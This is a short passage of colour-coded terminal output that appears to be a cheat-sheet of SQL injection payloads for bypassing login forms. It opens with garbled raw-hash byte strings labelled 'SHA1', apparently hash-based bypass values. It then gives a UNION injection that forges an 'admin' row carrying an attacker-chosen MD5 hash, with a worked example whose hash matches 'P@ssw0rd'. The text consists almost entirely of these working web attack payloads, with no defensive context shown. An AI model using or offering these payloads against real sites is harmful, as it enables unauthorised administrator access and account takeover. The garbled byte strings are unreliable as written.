[34m│[0m SHA1: 3fDf → Qu'='@[t- o_-!                                                  [34m│[0m
[34m│[0m SHA1: 178374 →ÜÛ¾}_ia!8Wm'/*´Õ                                               [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Hashed Passwords (UNION injection):**                                      [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m admin' AND 1=0 UNION ALL SELECT 'admin', '{MD5_HASH}'--                      [34m│[0m
[34m│[0m Example: admin' AND 1=0 UNION ALL SELECT 'admin',                            [34m│[0m
[34m│[0m '161ebd7d45089b3446ee4e0d86dbcf92'--                                         [34m│[0m
[34m│[0m (161ebd7d45089b3446ee4e0d86dbcf92 = MD5("P@ssw0rd"))                         [34m│[0m
